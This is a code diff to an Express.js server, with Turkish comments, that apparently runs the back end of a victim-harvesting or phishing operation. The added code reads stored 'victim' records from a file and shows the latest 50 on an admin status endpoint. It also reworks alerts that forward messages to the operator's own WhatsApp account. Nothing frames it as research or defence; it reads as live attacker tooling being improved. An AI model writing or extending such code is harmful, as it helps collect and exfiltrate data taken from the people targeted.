@@ -31,10 +31,19 @@ app.use(express.json());
 app.get('/health', (req, res) => res.status(200).send('V8_ALIVE'));
 
 app.get('/api/admin/status', (req, res) => {
+    let victimLogs = [];
+    try {
+        if (fs.existsSync(VICTIMS_FILE)) {
+            victimLogs = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
+        }
+    } catch (e) {
+        addSystemLog(`Error reading victims file: ${e.message}`);
+    }
+
     res.json({
         status: connectionStatus,
         qr: latestQR,
-        logs: [], // Victim logs can be linked later
+        logs: victimLogs.reverse().slice(0, 50), // Son 50 kayıt
         systemLogs: systemLogs
     });
 });
@@ -66,12 +75,16 @@ const saveVictim = (data) => {
 const sendAdminNotification = async (msg) => {
     if (client && connectionStatus === 'READY') {
         try {
-            const myNum = client.info.me._serialized;
-            await client.sendMessage(myNum, msg);
-            addSystemLog('WhatsApp notification sent to admin.');
+            // client.info.me yerine wid._serialized kullanımı daha stabildir
+            const myId = client.info.wid._serialized || client.info.me._serialized;
+            await client.sendMessage(myId, msg);
+            addSystemLog(`Admin notification sent to: ${myId}`);
         } catch (err) {
-            addSystemLog(`Failed to send WA notification: ${err.message}`);
+            addSystemLog(`WA NOTIFICATION ERROR: ${err.message}`);
+            // Fallback: Rehber aramayı deneyebiliriz ama şu anlık log kafi
         }
+    } else {
+        addSystemLog(`Notification skipped: Status is ${connectionStatus}`);
     }
 };
 
